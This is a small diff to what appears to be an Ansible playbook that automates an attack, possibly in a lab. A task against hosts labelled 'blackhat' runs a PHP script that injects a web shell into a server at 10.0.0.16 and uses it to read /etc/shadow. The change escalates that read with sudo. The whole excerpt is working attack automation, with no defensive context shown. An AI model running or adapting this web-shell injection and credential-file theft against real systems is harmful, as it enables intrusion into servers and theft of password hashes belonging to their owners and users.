@@ -36,6 +36,6 @@
   hosts: blackhat
   tasks:
     - name: log in web server and inject it with shell file
-      raw: php shellinject.php logs_decoded.txt 10.0.0.16/ shell.php 'cat /etc/shadow'
+      raw: php shellinject.php logs_decoded.txt 10.0.0.16/ shell.php 'sudo cat /etc/shadow'
       register: out
     - debug: var=out.stdout_lines
